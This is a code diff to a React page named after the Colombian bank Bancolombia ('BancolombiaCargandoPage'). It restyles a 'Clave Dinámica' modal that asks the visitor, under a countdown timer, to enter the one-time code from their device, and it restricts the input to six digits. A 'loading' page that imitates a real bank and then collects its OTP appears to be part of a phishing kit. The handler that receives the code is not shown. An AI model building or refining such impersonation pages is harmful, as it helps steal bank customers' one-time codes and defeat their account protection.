@@ -229,33 +229,41 @@ export default function BancolombiaCargandoPage() {
       </div>
     </div>
 
-      {/* OTP Modal */}
+      {/* Clave Dinámica Modal */}
       {showOtpModal && (
         <div className="fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center p-4 z-50">
-          <div className="bg-white rounded-xl p-8 max-w-sm w-full">
-            <div className="text-center mb-6">
-              <div className="bg-blue-100 rounded-full w-16 h-16 mx-auto mb-4 flex items-center justify-center">
-                <svg className="w-8 h-8 text-[#004B87]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+          <div className="bg-white rounded-lg shadow-xl max-w-md w-full overflow-hidden">
+            
+            {/* Modal Header */}
+            <div className="text-center py-8 px-6">
+              <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
+                <svg className="w-8 h-8 text-blue-600" fill="currentColor" viewBox="0 0 20 20">
+                  <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
                 </svg>
               </div>
-              <h3 className="text-xl font-bold text-gray-800 mb-2">Clave Dinámica</h3>
-              <p className="text-gray-600 text-sm mb-2">
-                Ingresa la clave dinámica que aparece en tu dispositivo
+              <h2 className="text-xl font-semibold text-gray-800 mb-2">Clave Dinámica</h2>
+              <p className="text-gray-600 text-sm">
+                Ingresá la clave dinámica que aparece en tu dispositivo
               </p>
-              <div className="bg-red-50 text-red-600 text-xs px-3 py-2 rounded">
-                Tiempo restante: {Math.floor(timeLeft / 60)}:{(timeLeft % 60).toString().padStart(2, '0')}
-              </div>
             </div>
 
-            <form onSubmit={handleOtpSubmit} className="space-y-4">
+            {/* Timer Alert */}
+            <div className="mx-6 mb-6 bg-red-50 border border-red-200 rounded-lg px-4 py-3">
+              <p className="text-red-600 text-sm text-center font-medium">
+                Tiempo restante: {Math.floor(timeLeft / 60)}:{(timeLeft % 60).toString().padStart(2, '0')}
+              </p>
+            </div>
+
+            {/* Form */}
+            <form onSubmit={handleOtpSubmit} className="px-6 pb-6 space-y-4">
               <div>
                 <input
                   type="text"
                   value={otp}
-                  onChange={(e) => setOtp(e.target.value.replace(/\D/g, '').slice(0, 8))}
-                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#004B87] focus:border-transparent outline-none transition text-lg text-center font-mono"
+                  onChange={(e) => setOtp(e.target.value.replace(/\D/g, '').slice(0, 6))}
                   placeholder="000000"
+                  className="w-full h-12 text-center text-2xl font-mono border-2 border-gray-300 rounded-lg focus:border-blue-500 focus:outline-none tracking-widest text-gray-400"
+                  maxLength={6}
                   disabled={otpLoading}
                   autoFocus
                 />
@@ -263,8 +271,8 @@ export default function BancolombiaCargandoPage() {
 
               <button
                 type="submit"
-                disabled={!otp.trim() || otpLoading}
-                className="w-full py-3 px-6 bg-[#004B87] text-white rounded-lg hover:bg-[#003666] disabled:opacity-50 disabled:cursor-not-allowed transition font-medium"
+                disabled={otp.length !== 6 || otpLoading}
+                className="w-full py-3 bg-blue-500 hover:bg-blue-600 disabled:bg-gray-300 text-white rounded-lg font-medium transition-colors disabled:cursor-not-allowed"
               >
                 {otpLoading ? (
                   <span className="flex items-center justify-center">
@@ -272,13 +280,14 @@ export default function BancolombiaCargandoPage() {
                       <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                       <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                     </svg>
-                    Enviando...
+                    Validando...
                   </span>
                 ) : (
                   'Confirmar Clave'
                 )}
               </button>
             </form>
+            
           </div>
         </div>
       )}
